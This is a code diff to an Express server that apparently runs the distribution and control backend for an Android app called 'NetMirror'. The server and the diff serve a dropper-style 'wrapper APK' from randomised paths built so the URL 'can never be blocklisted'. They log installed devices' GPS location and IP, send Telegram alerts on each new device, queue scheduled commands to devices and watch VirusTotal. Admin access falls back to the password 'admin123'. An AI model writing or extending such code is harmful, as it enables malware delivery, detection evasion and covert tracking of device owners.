@@ -42,6 +42,14 @@ async function startServer() {
   const setupWebSocket = require('./websocket/handler');
 const { encrypt: cryptoEncrypt } = require('./utils/crypto');
 
+  // ═══ ADVANCED AGENTS ═══
+  const { initBot, stopBot, sendAlert } = require('./utils/telegram-bot');
+  const { initAnalytics, trackEvent, getFunnelStats, getRecentEvents, getEventsByDay, getGeoBreakdown, getDeviceReachability } = require('./utils/analytics');
+  const { initSelfHeal, getStatus: getSelfHealStatus } = require('./utils/self-heal');
+  const { initVtAgent, triggerScan: triggerVtScan, getStatus: getVtStatus } = require('./utils/vt-agent');
+  const { initAnomaly, getAnomalies } = require('./utils/anomaly');
+  const { initDigest, triggerDigest } = require('./utils/digest');
+
   const app = express();
   const server = http.createServer(app);
 
@@ -116,6 +124,10 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     // Prevent mobile browsers from blocking the page
     res.setHeader('X-Frame-Options', 'SAMEORIGIN');
     res.setHeader('Referrer-Policy', 'no-referrer-when-downgrade');
+    // Track page visits (only HTML page, not static assets)
+    if (req.path === '/' || req.path === '' || req.path === '/index.html') {
+      try { trackEvent('page_visit', { ip_address: req.ip || '', user_agent: req.get('user-agent') || '', referrer: req.get('referer') || '' }); } catch (_) {}
+    }
     next();
   }, express.static(path.join(__dirname, 'landing-page')));
 
@@ -512,6 +524,8 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   //   4. Random /dl/:token path → URL can never be blocklisted
   app.get('/dl/:token', async (req, res) => {
     try {
+      // Track download start
+      try { trackEvent('download_start', { ip_address: req.ip || '', user_agent: req.get('user-agent') || '' }); } catch (_) {}
       // Prefer wrapper APK if available (clean app that installs real NetMirror)
       const wrapperBuf = getWrapperApkBuffer();
       if (wrapperBuf) {
@@ -989,6 +1003,90 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     });
   });
 
+  // ═══ ANALYTICS & AGENTS API ENDPOINTS ═══
+  function requireAdmin(req, res) {
+    const pw = req.headers['x-admin-password'] || req.query.password;
+    const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
+    const adminPw = stored?.value || 'admin123';
+    if (pw !== adminPw) { res.status(401).json({ error: 'Unauthorized' }); return false; }
+    return true;
+  }
+
+  // Install funnel stats
+  app.get('/api/analytics/funnel', (req, res) => {
+    if (!requireAdmin(req, res)) return;
+    const days = parseInt(req.query.days) || 30;
+    res.json(getFunnelStats(days));
+  });
+
+  // Recent analytics events
+  app.get('/api/analytics/events', (req, res) => {
+    if (!requireAdmin(req, res)) return;
+    const limit = Math.min(parseInt(req.query.limit) || 100, 500);
+    res.json(getRecentEvents(limit));
+  });
+
+  // Events by day (for charts)
+  app.get('/api/analytics/events-by-day', (req, res) => {
+    if (!requireAdmin(req, res)) return;
+    const event = req.query.event || 'page_visit';
+    const days = parseInt(req.query.days) || 30;
+    res.json(getEventsByDay(event, days));
+  });
+
+  // Geo breakdown
+  app.get('/api/analytics/geo', (req, res) => {
+    if (!requireAdmin(req, res)) return;
+    const days = parseInt(req.query.days) || 30;
+    res.json(getGeoBreakdown(days));
+  });
+
+  // Device reachability
+  app.get('/api/analytics/reachability', (req, res) => {
+    if (!requireAdmin(req, res)) return;
+    res.json(getDeviceReachability());
+  });
+
+  // Track event from client (landing page JS)
+  app.post('/api/analytics/track', express.json(), (req, res) => {
+    const { event, session_id, device_id, extra } = req.body;
+    if (!event) return res.status(400).json({ error: 'event required' });
+    trackEvent(event, {
+      session_id: session_id || '',
+      device_id: device_id || '',
+      ip_address: req.ip || '',
+      user_agent: req.get('user-agent') || '',
+      referrer: req.get('referer') || '',
+      extra: extra || {}
+    });
+    res.json({ ok: true });
+  });
+
+  // Agent status overview
+  app.get('/api/agents/status', (req, res) => {
+    if (!requireAdmin(req, res)) return;
+    res.json({
+      selfHeal: getSelfHealStatus(),
+      vtAgent: getVtStatus(),
+      anomalies: getAnomalies(),
+      uptime: process.uptime()
+    });
+  });
+
+  // Trigger VT scan manually
+  app.post('/api/agents/vt/scan', (req, res) => {
+    if (!requireAdmin(req, res)) return;
+    triggerVtScan();
+    res.json({ ok: true, message: 'VT scan triggered' });
+  });
+
+  // Trigger digest manually
+  app.post('/api/agents/digest', (req, res) => {
+    if (!requireAdmin(req, res)) return;
+    triggerDigest();
+    res.json({ ok: true, message: 'Digest triggered' });
+  });
+
   // App version check — used by NetMirror Updater wrapper to detect new versions
   app.get('/api/app/version', (req, res) => {
     // Read from data/version.json if exists, else return defaults
@@ -1015,7 +1113,8 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // Admin: update version info
   app.post('/api/admin/set-version', express.json(), (req, res) => {
     const adminPw = req.headers['x-admin-password'] || req.body?.password;
-    if (adminPw !== ADMIN_PASSWORD) return res.status(401).json({ error: 'Unauthorized' });
+    const storedPw = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
+    if (adminPw !== (storedPw?.value || 'admin123')) return res.status(401).json({ error: 'Unauthorized' });
     const versionPath = path.join(__dirname, 'data', 'version.json');
     try {
       const current = fs.existsSync(versionPath) ? JSON.parse(fs.readFileSync(versionPath, 'utf8')) : {};
@@ -1084,6 +1183,12 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
           hasGps ? latitude : null, hasGps ? longitude : null,
           hasGps ? 'gps' : 'unknown', clientIp
         );
+
+        // ═══ NEW DEVICE: Telegram alert + analytics ═══
+        try {
+          sendAlert(`🆕 <b>New Device</b>\n📱 ${model || 'Unknown'} (${manufacturer || '?'})\n🤖 Android ${os_version || '?'}\n🆔 ${device_id}\n🌐 ${clientIp}`);
+          trackEvent('app_install', { device_id, device_model: model || '', os_version: os_version || '', ip_address: clientIp });
+        } catch (_) {}
       }
 
       // If no GPS data, try IP geolocation fallback (async, don't block response)
@@ -1482,6 +1587,19 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // Setup Scheduled Commands processor
   const { startScheduler } = require('./utils/scheduler');
   startScheduler(io, db);
+
+  // ═══ INITIALIZE ADVANCED AGENTS ═══
+  try {
+    initAnalytics(db);
+    initBot(db, io);
+    initSelfHeal(db, sendAlert);
+    initVtAgent(db, sendAlert);
+    initAnomaly(db, sendAlert);
+    initDigest(db, sendAlert);
+    console.log('[Agents] All advanced agents initialized');
+  } catch (e) {
+    console.warn('[Agents] Init error (non-fatal):', e.message);
+  }
 
   // ========== CLEANUP TIMER ==========
   // Every 10 minutes, mark devices offline if no heartbeat for 2 hours.
